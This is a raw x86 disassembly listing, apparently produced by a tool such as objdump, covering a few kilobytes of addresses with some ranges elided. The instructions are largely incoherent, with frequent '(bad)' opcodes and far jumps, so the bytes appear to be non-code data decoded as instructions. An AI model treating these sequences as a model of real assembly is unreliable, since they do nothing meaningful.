  4267d0:	and    esp,DWORD PTR [esi+0x53a734c3]
  4267d6:	xor    DWORD PTR [edx+eax*2],esp
  4267d9:	shl    edi,0x4f
  4267dc:	sub    al,0x2c
  4267de:	fdivr  DWORD PTR [ebx-0x2d83611f]
  4267e4:	adc    ecx,ebx
  4267e6:	clc    
  4267e7:	push   eax
  4267e8:	int    0xe1
  4267ea:	out    0xa4,eax
  4267ec:	cmp    ecx,DWORD PTR [ecx+0x6]
  4267ef:	mov    ds:0xc69faf64,al
  4267f4:	pop    ds
  4267f5:	jne    0x4267a4
  4267f7:	xlat   BYTE PTR ds:[ebx]
  4267f8:	inc    ecx
  4267f9:	fcmovnu st,st(0)
  4267fb:	adc    al,BYTE PTR [eax+edi*4-0x3]
  4267ff:	push   0xffffff96
  426801:	push   esi
  426802:	sub    DWORD PTR [eax+ecx*8],0x2dc2b6bc
  426809:	cli    
  42680a:	mov    bl,0x1b
  42680c:	dec    edi
  42680d:	in     eax,0x19
  42680f:	cs push cs
  426811:	dec    edx
  426813:	add    esi,DWORD PTR [eax+0x6b63ba9b]
  426819:	in     al,dx
  42681a:	out    0xc7,eax
  42681c:	sbb    dl,BYTE PTR [ebx+0x713cb6ac]
  426822:	aad    0x0
  426824:	js     0x4267c4
  426826:	ret    0xa7b0
  426829:	clc    
  42682a:	es das 
  42682c:	rol    DWORD PTR [ebp+0x7f03aca],cl
  426832:	or     BYTE PTR es:0x6d8e9802,dl
  426839:	xlat   BYTE PTR ds:[ebx]
  42683a:	jge    0x426889
  42683c:	mov    BYTE PTR [bx+si+0x38ba],ah
  426841:	loope  0x4267d2
  426843:	frstor [edx+0x6b39cd97]
  426849:	mov    esi,0x13816cad
  42684e:	inc    ecx
  42684f:	mov    esi,0x1dda1d02
  426854:	mov    al,0x9a
  426856:	jle    0x426800
  426858:	push   cs
  426859:	and    al,0xeb
  42685b:	(bad)  
  42685c:	shl    BYTE PTR [edx+0x15],cl
  42685f:	(bad)  [edx-0x40]
  426862:	xchg   esi,eax
  426863:	popf   
  426864:	shl    dh,cl
  426866:	imul   ebp,DWORD PTR [edx],0xffffff88
  426869:	sbb    al,0x10
  42686b:	pop    esi
  42686c:	gs jmp 0x5f87e3d5
  426872:	rol    ebp,0x48
  426875:	cs mov al,0xc
  426878:	mov    DWORD PTR [ebp-0x63b2a1ef],esi
  42687e:	or     ecx,edx
  426880:	dec    ecx
  426881:	and    eax,0x3177e38a
  426886:	xor    dl,0x5
  426889:	or     BYTE PTR [ecx-0x2fa39cb0],dh
  42688f:	imul   ebx,DWORD PTR [esi+0x46],0xc4e3a0c7
  426896:	(bad)  
  426897:	jmp    0xda34d0af
  42689c:	pop    ebx
  42689d:	jae    0x4268e0
  42689f:	jns    0x426829
  4268a1:	ficom  DWORD PTR ds:0x96d97816
  4268a7:	adc    eax,0xad34a8a
  4268ac:	mov    al,0x8e
  4268ae:	jbe    0x426916
  4268b0:	js     0x42684e
  4268b2:	lock mov bh,0x4a
	...
  426915:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42691c:	mov    edi,?
  42691e:	cs out 0xa0,eax
  426921:	stos   DWORD PTR es:[edi],eax
  426922:	(bad)  
  426923:	hlt    
  426924:	arpl   WORD PTR [ebx+0x19b5e],di
  42692a:	pop    es
  42692b:	add    DWORD PTR [eax],eax
  42692d:	add    BYTE PTR [esi],ah
  42692f:	push   esi
  426930:	dec    ebx
  426931:	cmp    ch,BYTE PTR [esi-0x58491fa2]
  426937:	into   
  426938:	jae    0x42698d
  42693a:	ror    BYTE PTR [esi],cl
  42693c:	stc    
  42693d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42693e:	pushf  
  42693f:	popf   
  426940:	pop    ds
  426941:	push   edi
  426942:	stos   BYTE PTR es:[edi],al
  426943:	add    al,0xb6
  426945:	xchg   BYTE PTR fs:[eax+0x2a],ah
  426949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42694a:	leave  
  42694b:	mov    dl,0x9f
  42694d:	pop    edi
  42694e:	mov    DWORD PTR [edx+0x1bc53430],edi
  426954:	stc    
  426955:	cmp    BYTE PTR [ecx+ecx*2-0x6d793d78],ah
  42695c:	and    DWORD PTR [edx+0x30],esp
  42695f:	nop
  426960:	popa   
  426961:	jne    0x4269de
  426963:	test   edx,ebp
  426965:	push   ds
  426966:	jmp    DWORD PTR [ebx+eax*4]
  426969:	push   edi
  42696a:	enter  0xd9ed,0xb8
  42696e:	dec    edi
  42696f:	lock xchg edi,ecx
  426972:	pushf  
  426973:	ins    DWORD PTR es:[edi],dx
  426974:	ficom  DWORD PTR [edx]
  426976:	lahf   
  426977:	sub    BYTE PTR [ebp+0x1e66a49b],dl
  42697d:	addr16 push ds
  42697f:	fnstsw WORD PTR [ecx]
  426981:	jns    0x426930
  426983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426984:	test   ah,bl
  426986:	jo     0x426927
  426988:	gs push cs
  42698a:	cmp    DWORD PTR [edx+0x31e3da57],0xfcfa17b7
  426994:	lods   eax,DWORD PTR ds:[esi]
  426995:	push   ss
  426996:	jge    0x426996
  426998:	imul   ebx,eax,0xc64819a2
  42699e:	xor    DWORD PTR [eax],0xce520a8b
  4269a4:	xchg   al,dl
  4269a6:	test   DWORD PTR [edx+ebp*8-0x58a7ec98],esi
  4269ad:	or     eax,esp
  4269af:	lahf   
  4269b0:	cld    
  4269b1:	push   es
  4269b2:	outs   dx,BYTE PTR ds:[esi]
  4269b3:	dec    ecx
  4269b4:	sbb    edi,DWORD PTR [ecx+0x15]
  4269b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269b8:	adc    ecx,esi
  4269ba:	(bad)  
  4269bb:	jae    0x426a37
  4269bd:	push   ds
  4269be:	xchg   esi,eax
  4269bf:	lods   al,BYTE PTR ds:[esi]
  4269c0:	test   al,0x19
  4269c2:	xor    esi,DWORD PTR [ebx]
  4269c4:	mov    esp,0x6af01798
  4269c9:	and    al,0x3f
  4269cb:	sbb    BYTE PTR [ebx],0xc6
  4269ce:	mov    edi,0xc117a5ae
  4269d3:	sub    al,0x4d
  4269d5:	xchg   dh,al
  4269d7:	ins    DWORD PTR es:[edi],dx
  4269d8:	sbb    ecx,DWORD PTR [eax]
  4269da:	push   cs
  4269db:	lea    edi,[ebx-0x24199269]
  4269e1:	xchg   esi,ecx
  4269e3:	repnz mov BYTE PTR [bx+0x13e2],dl
  4269e9:	sahf   
  4269ea:	mov    bl,0x5c
  4269ec:	test   BYTE PTR [ebx-0x68],dh
  4269ef:	and    eax,DWORD PTR [esi]
  4269f1:	jne    0x426975
  4269f3:	jne    0x4269d5
  4269f5:	jne    0x4269c2
  4269f7:	inc    edi
  4269f8:	(bad)  [eax-0x5a]
  4269fb:	xchg   edi,eax
  4269fc:	inc    esi
  4269fd:	jge    0x4269e2
  4269ff:	retf   
  426a00:	fsub   DWORD PTR [ecx+0x31]
  426a03:	xchg   DWORD PTR [edi+edx*8-0x99af149],ecx
  426a0a:	add    bh,cl
  426a0c:	cmp    eax,0x88a74657
  426a11:	adc    eax,edi
  426a13:	mov    dl,0x14
  426a15:	mov    cl,BYTE PTR [esi]
  426a17:	jmp    0x87424b89
  426a1c:	mov    ecx,0x684caa37
  426a21:	arpl   WORD PTR [edi],bp
  426a23:	jo     0x4269ed
  426a25:	mov    dl,BYTE PTR [esi-0x196e8e8a]
  426a2b:	sbb    eax,0x4b825b06
  426a30:	sti    
  426a31:	rcl    BYTE PTR ds:0xe24e,1
	...
  426a93:	add    BYTE PTR [eax],al
  426a95:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426a9b:	ja     0x426a78
  426a9d:	out    dx,eax
  426a9e:	xor    dl,BYTE PTR [edi+eiz*4]
  426aa1:	cld    
  426aa2:	ds leave 
  426aa4:	sti    
  426aa5:	jne    0x426b0c
  426aa7:	pushf  
  426aa8:	add    DWORD PTR [eax],eax
  426aaa:	pop    es
  426aab:	add    DWORD PTR [eax],eax
  426aad:	add    bl,dh
  426aaf:	mov    dh,0xfa
  426ab1:	sti    
  426ab2:	repz in eax,dx
  426ab4:	addr16 jne 0x426b0a
  426ab7:	push   ebp
  426ab8:	cli    
  426ab9:	mov    ebp,0xe6dc5552
  426abe:	inc    ebp
  426abf:	cmp    BYTE PTR [bx],ch
  426ac2:	xor    dh,ah
  426ac4:	ror    ah,1
  426ac6:	jmp    FWORD PTR [ebx+0x63fe9c77]
  426acc:	sbb    ebp,ebp
  426ace:	jp     0x426b34
  426ad0:	cmp    DWORD PTR [edi+ebp*1-0x75],ebx
  426ad4:	int    0xf0
  426ad6:	iret   
  426ad7:	aam    0x12
  426ad9:	cmp    edx,DWORD PTR [edi-0x3f]
  426adc:	pop    edx
  426add:	std    
  426ade:	sbb    DWORD PTR [edx+0x4512874b],ecx
  426ae4:	add    edi,DWORD PTR [ecx-0x50]
  426ae7:	daa    
  426ae8:	rol    BYTE PTR [esi],1
  426aea:	retf   0x40e9
  426aed:	dec    esi
  426aee:	dec    edx
  426aef:	dec    edi
  426af0:	mov    edx,0xe0a441bb
  426af5:	mov    al,0xc4
  426af7:	mov    ebx,0x2d8bbc75
  426afc:	es pop eax
  426afe:	hlt    
  426aff:	pop    ebx
  426b00:	push   ecx
  426b01:	sbb    al,BYTE PTR [edi]
  426b03:	add    bh,dl
  426b05:	setne  BYTE PTR [edi]
  426b08:	push   ecx
  426b09:	leave  
  426b0a:	in     al,dx
  426b0b:	inc    edx
  426b0c:	mov    esi,0xad57c1ac
  426b11:	adc    eax,DWORD PTR [ebp+0x755b1a3d]
  426b17:	mov    al,ds:0x2ccac7b5
  426b1c:	or     DWORD PTR [eax+0x14],ebp
  426b1f:	out    dx,eax
  426b20:	push   ebx
  426b21:	cli    
  426b22:	mov    dl,0x26
  426b24:	mov    ah,0xcf
  426b26:	sub    ch,bl
  426b28:	rol    ebx,0xc9
  426b2b:	inc    eax
  426b2c:	jecxz  0x426b22
  426b2e:	cmc    
  426b2f:	sub    BYTE PTR [ebx],bh
  426b31:	mov    edx,0xe15cb0fb
  426b36:	(bad)
  426b3b:	ret    
  426b3c:	arpl   dx,cx
  426b3e:	dec    ecx
  426b3f:	aaa    
  426b40:	push   ebp
  426b41:	aas    
  426b42:	ins    BYTE PTR es:[edi],dx
  426b43:	jp     0x426afe
  426b45:	dec    esp
  426b46:	test   ebp,ecx
  426b48:	pop    eax
  426b49:	(bad)  
  426b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b4b:	outs   dx,DWORD PTR ds:[esi]
  426b4c:	fisub  DWORD PTR [ebp+0x61]
  426b4f:	xchg   BYTE PTR [ebp+0x55],ch
  426b52:	sti    
  426b53:	pop    es
  426b54:	pop    es
  426b55:	push   es
  426b56:	cmc    
  426b57:	jmp    0xa8f154bb
  426b5c:	int3   
  426b5d:	adc    BYTE PTR [ebx+0x44],cl
  426b60:	mov    cl,0x8d
  426b62:	sbb    eax,0xa78567b9
  426b67:	inc    ebp
  426b68:	push   es
  426b69:	sbb    ebp,DWORD PTR [ecx-0x14]
  426b6c:	loope  0x426b04
  426b6e:	mov    eax,0x76ca853c
  426b73:	js     0x426bcb
  426b75:	pop    ebp
  426b76:	cmp    al,0xd4
  426b78:	stc    
  426b79:	mov    WORD PTR [edi+ebp*1-0x28f0b328],ss
  426b80:	lods   al,BYTE PTR ds:[esi]
  426b81:	leave  
  426b82:	push   ecx
  426b83:	int    0xfa
  426b85:	dec    ebp
  426b86:	mov    ebp,0xf632dc31
  426b8b:	jg     0x426b9f
  426b8d:	nop
  426b8e:	pop    ss
  426b8f:	cmp    DWORD PTR [ecx+ecx*2+0x59],ebp
  426b93:	rol    BYTE PTR [ecx+0x51a333ee],1
  426b99:	push   0xa
  426b9b:	out    dx,eax
  426b9c:	iret   
  426b9d:	dec    ebp
  426b9e:	ret    
  426b9f:	popa   
  426ba0:	adc    BYTE PTR [edx+0x19],ah
  426ba3:	call   0xb08fc44a
  426ba8:	je     0x426bd2
  426baa:	jecxz  0x426bcb
  426bac:	jne    0x426ba9
  426bae:	test   dh,ch
  426bb0:	in     al,dx
  426bb1:	test   al,0x7a
  426bb3:	fiadd  WORD PTR [edx+0x0]
	...
  426c15:	add    dl,ah
  426c17:	pusha  
  426c18:	test   DWORD PTR [esi+0x74f3f787],esi
  426c1e:	je     0x426c67
  426c20:	push   0xffffffb6
  426c22:	test   esp,edi
  426c24:	inc    edx
  426c25:	aas    
  426c26:	ins    BYTE PTR es:[edi],dx
  426c27:	popf   
  426c28:	add    DWORD PTR [eax],eax
  426c2a:	pop    es
  426c2b:	add    DWORD PTR [eax],eax
  426c2d:	add    BYTE PTR [ebp+0x24],ch
  426c30:	mov    bh,dh
  426c32:	xor    ebx,edi
  426c34:	daa    
  426c35:	icebp  
  426c36:	je     0x426c86
  426c38:	lods   al,BYTE PTR ds:[esi]
  426c39:	js     0x426c05
  426c3b:	and    BYTE PTR [edi-0x2545459],0xac
  426c42:	push   cs
  426c43:	aas    
  426c44:	mov    dh,0x37
  426c46:	popa   
  426c47:	sub    esp,DWORD PTR [ebx-0x40251709]
  426c4d:	mov    bh,BYTE PTR [ecx+0x25]
  426c50:	call   0x8438e45a
  426c55:	std    
  426c56:	mov    edx,0x7dc58292
  426c5b:	jae    0x426cc5
  426c5d:	pop    ebx
  426c5e:	sub    BYTE PTR [ebx-0x145a4eb6],ah
  426c64:	loop   0x426c0a
  426c66:	push   0xa63b7385
  426c6b:	push   0x71156ac4
  426c70:	bound  esp,QWORD PTR [edi+0x66]
  426c73:	or     al,0xfb
  426c75:	fiadd  WORD PTR [edi]
  426c77:	mov    bh,0x31
  426c79:	jbe    0x426ca6
  426c7b:	das    
  426c7c:	push   cs
  426c7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c7e:	sub    eax,0xd113f4aa
  426c83:	and    eax,0xd1e7170f
  426c88:	or     BYTE PTR [eax+0x5f],bl
  426c8b:	fwait
  426c8c:	xchg   DWORD PTR [edx-0x581cd833],ebx
  426c92:	jno    0x426c75
  426c94:	mov    bh,0x8a
  426c96:	aaa    
  426c97:	adc    ah,BYTE PTR ds:0x7ad9643b
  426c9d:	mov    edi,0x6f57cff5
  426ca2:	mov    dl,0xaa
  426ca4:	lods   eax,DWORD PTR ds:[esi]
  426ca5:	pop    eax
  426ca6:	sub    eax,0x715c76c3
  426cab:	and    BYTE PTR [esi-0x7ab12010],0x45
  426cb2:	cld    
  426cb3:	lock and eax,0x9ac84886
  426cb9:	int3   
  426cba:	or     ah,BYTE PTR [eax+0x28]
  426cbd:	or     eax,0xfd7e5936
  426cc2:	xchg   ecx,eax
  426cc3:	aad    0x2b
  426cc5:	and    DWORD PTR [ebx+eiz*4+0x67],esi
  426cc9:	sub    al,0xe9
  426ccb:	sub    ebx,ecx
  426ccd:	sbb    al,0xc3
  426ccf:	ret    0xa077
  426cd2:	scas   eax,DWORD PTR es:[edi]
  426cd3:	cmp    ecx,DWORD PTR [edx]
  426cd5:	xor    dh,BYTE PTR [edx+0x2f]
  426cd8:	push   DWORD PTR [eax+0x40914ef3]
  426cde:	rcr    DWORD PTR [ebx+0x298f413b],1
  426ce4:	lahf   
  426ce5:	pop    ecx
  426ce6:	xchg   esi,eax
  426ce7:	inc    esp
  426ce8:	repz adc dl,BYTE PTR [ebx+0x5f]
  426cec:	sbb    al,0xc7
  426cee:	dec    esp
  426cef:	scas   eax,DWORD PTR es:[edi]
  426cf0:	ror    BYTE PTR [esi-0x1dd2204],1
  426cf6:	bound  eax,QWORD PTR [ecx+ebp*1]
  426cf9:	push   esi
  426cfa:	out    dx,al
  426cfb:	xchg   DWORD PTR [esi-0x249f8e82],edx
  426d01:	pop    ebx
  426d02:	adc    ebx,0xffffffd0
  426d05:	retf   0x2f3b
  426d08:	jb     0x426d5b
  426d0a:	mov    bh,0xc3
  426d0c:	mov    cl,BYTE PTR [esi-0x52085186]
  426d12:	inc    ebp
  426d13:	sub    al,0x7c
  426d15:	xchg   esi,eax
  426d16:	(bad)  
  426d17:	adc    al,0x59
  426d19:	xchg   ebp,eax
  426d1a:	stc    
  426d1b:	das    
  426d1c:	std    
  426d1d:	push   eax
  426d1e:	push   edi
  426d1f:	loope  0x426cbd
  426d21:	or     DWORD PTR [edi+0x2e],esp
  426d24:	scas   al,BYTE PTR es:[edi]
  426d25:	(bad)  
  426d26:	(bad)
  426d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d2b:	ror    bl,0x85
  426d2e:	in     eax,dx
  426d2f:	mov    eax,0x914baf19
  426d34:	outs   dx,BYTE PTR ds:[esi]
	...
  426d95:	add    BYTE PTR [edx],cl
  426d97:	mov    cl,0x61
  426d99:	repz sti 
  426d9b:	repz call 0xd687:0x7e1b1bf9
  426da3:	xchg   BYTE PTR [edi+0x19e7320],bl
  426da9:	add    BYTE PTR [edi],al
  426dab:	add    DWORD PTR [eax],eax
  426dad:	add    ch,ah
  426daf:	(bad)  
  426db0:	cmp    al,0x1d
  426db2:	sahf   
  426db3:	sub    ebx,DWORD PTR gs:[edx]
  426db6:	pop    ds
  426db7:	out    0x16,eax
  426db9:	rcl    BYTE PTR [ebp-0x61d5850a],1
  426dbf:	addr16 into 
  426dc1:	xlat   BYTE PTR ss:[ebx]
  426dc3:	add    eax,0xf91f9b51
  426dc8:	jb     0x426dbc
  426dca:	cli    
  426dcb:	jmp    0x426de2
  426dcd:	ror    esp,1
  426dcf:	dec    esi
  426dd0:	xchg   ecx,eax
  426dd1:	push   eax
  426dd2:	sti    
  426dd3:	shl    DWORD PTR [ebx+eiz*2],1
  426dd6:	dec    ebx
  426dd7:	mov    dl,0x1d
  426dd9:	mov    ah,BYTE PTR [edx+0x77e9421]
  426ddf:	mov    al,ah
  426de1:	inc    edi
  426de2:	xor    DWORD PTR [esi],edx
  426de4:	lock and ebp,DWORD PTR [ebp+0xe]
  426de8:	enter  0x56e3,0x62
  426dec:	fstp   QWORD PTR [ebp+0x7a]
  426def:	adc    bl,BYTE PTR [edx-0x214ffc68]
  426df5:	sub    eax,0x2ea6a50f
  426dfa:	dec    esp
  426dfb:	in     eax,0xd8
  426dfd:	pusha  
  426dfe:	mov    esi,0x9d9f2440
  426e03:	xor    ch,BYTE PTR [edi]
  426e05:	cdq    
  426e06:	xor    dh,dl
  426e08:	rcr    DWORD PTR [ebx-0x6c248e71],1
  426e0e:	push   0x68
  426e10:	jp     0x426dd5
  426e12:	push   edx
  426e13:	dec    edx
  426e14:	inc    edi
  426e15:	xchg   BYTE PTR [ebx-0x21],bh
  426e18:	loope  0x426dfa
  426e1a:	sbb    al,0x42
  426e1c:	out    0x17,eax
  426e1e:	push   ebx
  426e1f:	shl    BYTE PTR [eax-0x6d],1
  426e22:	mov    esi,0x6162b6ba
  426e27:	fcmovu st,st(7)
  426e29:	adc    al,ch
  426e2b:	pop    ss
  426e2c:	sub    cl,BYTE PTR [esi+0x12]
  426e2f:	cmp    edx,DWORD PTR [ebp+0x7d]
  426e32:	imul   ecx,DWORD PTR [eax+0x4e],0x5aec24fc
  426e39:	sbb    eax,0xdd21a033
  426e3e:	cs fst st(1)
  426e41:	ret    
  426e42:	test   DWORD PTR ds:0xfef2803c,esp
  426e48:	cdq    
  426e49:	jo     0x426e39
  426e4b:	fs push es
  426e4d:	outs   dx,DWORD PTR fs:[esi]
  426e4f:	push   0x44
  426e51:	mov    ah,0xc4
  426e53:	sbb    ebp,DWORD PTR gs:[esi-0x52]
  426e57:	xchg   esp,eax
  426e58:	std    
  426e59:	dec    edx
  426e5a:	dec    esp
  426e5b:	imul   eax,DWORD PTR [esp+ecx*1],0xcd3b6a30
  426e62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e63:	rcr    BYTE PTR [eax+eiz*2-0x4c6dfac9],1
  426e6a:	icebp  
  426e6b:	ss daa 
  426e6d:	mov    DWORD PTR [esi-0x6f],0xcc841369
  426e74:	mov    BYTE PTR [esi],bh
  426e76:	icebp  
  426e77:	clc    
  426e78:	sub    ebp,DWORD PTR [ebp+0x6fb8c728]
  426e7e:	inc    esi
  426e7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e80:	push   edi
  426e81:	fist   WORD PTR [edx+0x6bfd2b49]
  426e87:	inc    ebx
  426e88:	nop
  426e89:	cs out 0x3e,eax
  426e8c:	retf   
  426e8d:	rol    DWORD PTR [esi],1
  426e8f:	ss mov edx,0xd4422424
  426e95:	fcomp  st(2)
  426e97:	xchg   BYTE PTR [edx+ebx*8-0x4927eb07],bh
  426e9e:	fcmovnu st,st(6)
  426ea0:	or     al,0x21
  426ea2:	out    0xd9,al
  426ea4:	jae    0x426ed4
  426ea6:	(bad)  
  426ea7:	xor    esi,DWORD PTR [ebx-0x1bea76da]
  426ead:	jne    0x426e4e
  426eaf:	aaa    
  426eb0:	dec    esp
  426eb1:	std    
  426eb2:	mov    ds:0x799e,eax
	...
  426f13:	add    BYTE PTR [eax],al
  426f15:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f1c:	mov    dh,0xf7
  426f1e:	pop    eax
  426f1f:	or     BYTE PTR [ecx-0x1c4a995c],ch
  426f25:	add    eax,0x19f7a
  426f2a:	pop    es
  426f2b:	add    DWORD PTR [eax],eax
  426f2d:	add    al,bh
  426f2f:	jae    0x426f90
  426f31:	and    al,BYTE PTR [edx+0x3f]
  426f34:	jmp    0x702a:0xb7afaf0b
  426f3b:	or     eax,DWORD PTR [ebp+0x64]
  426f3e:	cld    
  426f3f:	or     BYTE PTR [ebx-0x1f97be71],ah
  426f45:	aaa    
  426f46:	jns    0x426f49
  426f48:	add    BYTE PTR [ecx],cl
  426f4a:	inc    esi
  426f4b:	mov    ebx,0xe399f970
  426f50:	inc    ebp
  426f51:	daa    
  426f52:	jmp    0x4311:0x5eed5749
  426f59:	std    
  426f5a:	hlt    
  426f5b:	neg    DWORD PTR [ecx+0x43e838bc]
  426f61:	setp   BYTE PTR [ebp-0x35305d69]
  426f68:	imul   edx,DWORD PTR [eax+ebx*4+0x77],0xffffffce
  426f6d:	pop    edi
  426f6e:	or     BYTE PTR [edi],bh
  426f70:	or     ebp,DWORD PTR [eax+0x7e]
  426f73:	scas   al,BYTE PTR es:[edi]
  426f74:	ds push ecx
  426f76:	adc    DWORD PTR [eax],ecx
  426f78:	ins    BYTE PTR es:[edi],dx
  426f79:	add    al,0x6c
  426f7b:	mov    ch,0xd7
  426f7d:	pop    ss
  426f7e:	std    
  426f7f:	jmp    0x7120846
  426f84:	adc    eax,0xb3205bbc
  426f89:	xor    DWORD PTR [eax],ebx
  426f8b:	push   es
  426f8c:	mov    es,WORD PTR [eax+0x7b0c55d4]
  426f92:	mov    bl,0xb2
  426f94:	pusha  
  426f95:	inc    esi
  426f96:	stos   DWORD PTR es:[edi],eax
  426f97:	data16 fdiv st,st(6)
  426f9a:	aad    0xb5
  426f9c:	push   0x47646e66
  426fa1:	fs jl  0x426fd7
  426fa4:	leave  
  426fa5:	xchg   BYTE PTR [ecx],dl
  426fa7:	xchg   ebx,eax
  426fa8:	call   0x91ce0ada
  426fad:	xor    al,0x6a
  426faf:	int3   
  426fb0:	fldenv [eax-0x9]
  426fb3:	push   ebp
  426fb4:	push   ebx
  426fb5:	mov    esi,0x9576bda
  426fba:	retf   0xb06
  426fbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fbe:	jns    0x426ff1
  426fc0:	in     al,0x8d
  426fc2:	enter  0x75bf,0xd0
  426fc6:	leave  
  426fc7:	call   0xbd7f:0x5352e252
  426fce:	sbb    bl,BYTE PTR ds:0x90ce5455
  426fd4:	push   DWORD PTR [ebx]
  426fd6:	mov    BYTE PTR [ebx],bh
  426fd8:	sub    al,0x20
  426fda:	dec    eax
  426fdb:	jg     0x426fcf
  426fdd:	sub    DWORD PTR [edi],ebx
  426fdf:	cdq    
  426fe0:	into   
  426fe1:	cmp    DWORD PTR [esi+0x1e],eax
  426fe4:	dec    ebx
  426fe5:	xor    DWORD PTR [esi],ecx
  426fe7:	pop    esi
  426fe8:	stc    
  426fe9:	cli    
  426fea:	popa   
  426feb:	sbb    bl,BYTE PTR [esi-0x51]
  426fee:	fild   DWORD PTR [esi]
  426ff0:	hlt    
  426ff1:	jmp    0x1493:0xd8514c3b
  426ff8:	sub    eax,0x10bb876b
  426ffd:	nop
  426ffe:	dec    esi
  426fff:	add    edx,DWORD PTR [edx+esi*4+0x6f2a97ee]
  427006:	inc    ebp
  427007:	pop    ds
  427008:	dec    eax
  427009:	add    eax,0xa2721651
  42700e:	fwait
  42700f:	sbb    al,0x8d
  427011:	outs   dx,DWORD PTR ds:[esi]
  427012:	pushw  ss
  427014:	cmc    
  427015:	aaa    
  427016:	mov    ecx,0x85f8c1e
  42701b:	scas   eax,DWORD PTR es:[edi]
  42701c:	das    
  42701d:	jo     0x427070
  42701f:	adc    eax,DWORD PTR [ecx+0x74]
  427022:	aaa    
  427023:	shl    BYTE PTR [esi-0x29],1
  427026:	push   edi
  427027:	push   esp
  427028:	adc    esp,DWORD PTR [esi]
  42702a:	add    al,0xd3
  42702c:	jae    0x427076
  42702e:	sub    eax,0xf91a22a4
  427033:	add    eax,0x32
	...
  427094:	add    BYTE PTR [eax],al
  427096:	or     al,0x6d
  427098:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42709e:	stos   DWORD PTR es:[edi],eax
  42709f:	sbb    DWORD PTR [eax+0x3b4cdec6],eax
  4270a5:	add    BYTE PTR [ecx+0x70001a0],al
  4270ab:	add    DWORD PTR [eax],eax
  4270ad:	add    dh,dl
  4270af:	mov    dh,0xba
  4270b1:	int    0x51
  4270b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270b4:	cmp    eax,DWORD PTR [eax-0x1f900bb0]
  4270ba:	xchg   ebp,eax
  4270bb:	fdiv   DWORD PTR [eax+edx*4]
  4270be:	sbb    DWORD PTR [edi-0x71],edi
  4270c1:	push   ss
  4270c2:	stos   BYTE PTR es:[edi],al
  4270c3:	gs je  0x427055
  4270c6:	pop    ebp
  4270c7:	adc    dh,BYTE PTR [esi+0x6b5ad3aa]
  4270cd:	ret    0xdeea
  4270d0:	dec    edi
  4270d1:	fucom  st(5)
  4270d3:	mov    BYTE PTR [edx],al
  4270d5:	xor    al,0x5e
  4270d8:	(bad)  
  4270da:	inc    eax
  4270db:	(bad)  
  4270dc:	xor    eax,DWORD PTR [ebx]
  4270de:	aaa    
  4270df:	sub    DWORD PTR [edx],ecx
  4270e1:	cmp    eax,DWORD PTR [edi-0x21c8ba3b]
  4270e7:	in     eax,dx
  4270e8:	sti    
  4270e9:	int    0xb
  4270eb:	neg    BYTE PTR [eax]
  4270ed:	pop    ecx
  4270ee:	stos   BYTE PTR es:[edi],al
  4270ef:	mov    edx,DWORD PTR [esi-0x36]
  4270f2:	xor    edx,edx
  4270f4:	or     DWORD PTR [ebp+0x1d2c7482],edx
  4270fa:	adc    esp,ecx
  4270fc:	fdiv   QWORD PTR [edi]
  4270fe:	aam    0xd2
  427100:	push   edx
  427101:	sbb    bh,dl
  427103:	loope  0x4270c3
  427105:	daa    
  427106:	or     BYTE PTR [eax-0x19fea2a5],dh
  42710c:	fld    TBYTE PTR [ebp+esi*4+0x43]
  427110:	ds call 0x29ce6f99
  427116:	pop    ebx
  427117:	adc    eax,0x87800b96
  42711c:	jle    0x4270da
  42711e:	dec    ebp
  42711f:	imul   BYTE PTR [ecx-0x75]
  427122:	jmp    0xee93c0d5
  427127:	call   0xfb39:0xde2f4725
  42712e:	daa    
  42712f:	adc    ch,0x2e
  427132:	jecxz  0x4270b8
  427134:	mov    eax,ds:0x3d94fac6
  427139:	fucomp st(0)
  42713b:	sub    ebx,DWORD PTR [ecx-0x200c5753]
  427141:	adc    ebp,esp
  427143:	stc    
  427144:	ret    0xb6e
  427147:	push   ebp
  427148:	add    BYTE PTR [esi],bh
  42714a:	repnz mov bh,0xf
  42714d:	jne    0x4270e3
  42714f:	inc    ecx
  427150:	xor    al,0x52
  427152:	(bad)  
  427153:	repz aas 
  427155:	rcl    BYTE PTR [ebp+0x52],1
  427158:	jne    0x427129
  42715a:	ds loope 0x427129
  42715d:	push   edi
  42715e:	data16 sub BYTE PTR es:[ecx],dl
  427162:	loop   0x4271cc
  427164:	add    dl,BYTE PTR [esi+0x4805aff5]
  42716a:	push   ebp
  42716b:	imul   DWORD PTR [edx+0x49]
  42716e:	mov    ds:0x570ac918,al
  427173:	inc    ebx
  427174:	je     0x427163
  427176:	pop    ds
  427177:	mov    esp,0x495e78a9
  42717c:	mov    ebp,cs
  42717e:	jle    0x4271be
  427180:	jge    0x4271b5
  427182:	rcl    bl,cl
  427184:	adc    al,ch
  427186:	sub    al,0x7f
  427188:	sahf   
  427189:	adc    esp,DWORD PTR [edx-0x27d74744]
  42718f:	out    dx,al
  427190:	or     DWORD PTR [ebp+0x3cac0e68],edi
  427196:	iret   
  427197:	dec    ebp
  427198:	imul   eax,DWORD PTR [ecx-0x69],0x8db7cc79
  42719f:	mov    cl,0x17
  4271a1:	mov    esp,0xbb37f25b
  4271a6:	nop
  4271a7:	aas    
  4271a8:	jbe    0x42715c
  4271aa:	jns    0x42720c
  4271ac:	mov    eax,0xd24d2b5a
  4271b1:	mov    bl,0x2d
  4271b3:	das    
  4271b4:	mov    eax,0x0
	...
  427215:	add    BYTE PTR [esi],bl
  427217:	inc    ecx
  427218:	fdiv   QWORD PTR [edi+ebx*8+0x77eb7ebd]
  42721f:	push   0x4b8c0100
  427224:	shufps xmm1,XMMWORD PTR [eax+0x70001a1],0x1
  42722c:	add    BYTE PTR [eax],al
  42722e:	mov    bh,0xda
